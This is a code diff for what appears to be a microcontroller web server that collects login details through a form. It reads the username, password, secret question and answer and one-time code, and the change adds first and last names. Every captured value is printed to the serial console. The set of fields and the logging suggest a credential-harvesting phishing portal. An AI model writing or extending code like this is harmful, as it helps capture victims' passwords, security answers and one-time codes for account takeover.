@@ -30,6 +30,8 @@ String password;
 bool name_received = false;
 bool password_received = false;
 
+String first_name;
+String last_name;
 String secret_question;
 String secret_answer;
 String otp;
@@ -138,6 +140,18 @@ void setupServer()
       inputParam = "password";
       password = inputMessage;
       password_received = true;
+    }
+
+    if (request->hasParam("first_name")) {
+      first_name = request->getParam("first_name")->value();
+    } else {
+      first_name = "";
+    }
+
+    if (request->hasParam("last_name")) {
+      last_name = request->getParam("last_name")->value();
+    } else {
+      last_name = "";
     }
 
     if (request->hasParam("secret_question")) {
@@ -290,14 +304,18 @@ void loop()
   {
     name_received = false;
     password_received = false;
-    String logValue1 = "u: " + user_name;
-    String logValue2 = "p: " + password;
+    String logValue1 = "Username: " + user_name;
+    String logValue2 = "Password: " + password;
 
     Serial.println("---------------------------------------"); // Added semicolon
-    
     Serial.println(logValue1);
     Serial.println(logValue2);
-
+    if (!first_name.isEmpty()) {
+      Serial.println("first name: " + first_name);
+    }
+    if (!last_name.isEmpty()) {
+      Serial.println("last name: " + last_name);
+    }
     if (!secret_question.isEmpty()) {
       Serial.println("Secret Q: " + secret_question);
     }
